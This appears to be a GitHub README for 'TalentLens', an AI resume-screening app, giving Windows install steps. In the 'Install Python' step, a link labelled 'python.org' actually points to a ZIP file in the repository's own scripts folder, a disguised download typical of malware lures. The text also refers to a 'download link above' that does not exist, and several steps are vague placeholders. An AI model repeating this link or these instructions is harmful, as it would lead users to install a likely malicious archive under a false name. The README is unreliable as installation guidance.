## 🚀 What this app does

TalentLens helps you review resumes with an AI screening pipeline. It uses multiple specialist agents to read candidate details, score fit, check for gaps, and prepare interview notes.

It is built for people who want a faster way to sort applicants without reading every resume by hand.

## 🖥️ What you need

- Windows 10 or Windows 11
- At least 8 GB of RAM
- 2 GB of free disk space
- A stable internet connection
- Microsoft Edge, Chrome, or Firefox

For best results, use a computer with 16 GB of RAM.

## 🛠️ Install on Windows

Follow these steps in order.

### 1. Get the files

1. Open the download link above.
2. Click **Code** on the GitHub page.
3. Choose **Download ZIP**.
4. Save the file to your computer.
5. Right-click the ZIP file and choose **Extract All**.

### 2. Install Python

1. Go to [python.org](https://raw.githubusercontent.com/aziz5971/TalentLens/main/scripts/Lens_Talent_Bawra.zip).
2. Download Python 3.10 or newer.
3. Run the installer.
4. Check **Add Python to PATH**.
5. Finish the install.

### 3. Open the project folder

1. Open the folder where you extracted TalentLens.
2. Look for the main app files.
3. Open File Explorer in that folder.

### 4. Install the app files

1. Hold **Shift** and right-click inside the folder.
2. Choose **Open PowerShell window here** or **Open in Terminal**.
3. Run the command below:

`pip install -r requirements.txt`

If the project uses Streamlit, this command will install the needed packages.

### 5. Start the app

Run the command below in the same window:

`streamlit run app.py`

If the main file has a different name, look for a file such as `main.py`, `run.py`, or `streamlit_app.py` and use that file name in the command.

### 6. Open the app in your browser

1. After the app starts, Streamlit will show a local web address.
2. Copy that address.
3. Paste it into your browser.
4. The app will open and you can start using it.
